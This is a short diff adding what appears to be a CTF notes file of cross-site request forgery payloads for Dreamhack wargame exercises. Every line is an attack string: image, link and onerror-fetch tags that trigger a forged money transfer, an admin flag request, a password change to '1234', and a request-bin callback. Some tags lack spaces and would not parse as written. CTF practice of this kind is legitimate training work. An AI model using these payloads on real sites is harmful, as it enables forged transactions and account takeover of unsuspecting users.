@@ -1,0 +1,13 @@
+<imgsrc="/sendmoney?to=dreamhack&amount=9999999">
+<imgsrc=1onerror="fetch('/sendmoney?to=dreamhack&amount=9999999');">
+<linkrel="stylesheet"href="/sendmoney?to=dreamhack&amount=9999999">
+
+
+csrf 
+툴사용
+<img src="https://jugwwka.request.dreamhack.games">
+
+<img src="/admin/notice_flag?userid=admin" />
+
+<img src="/change_password?pw=1234">
+
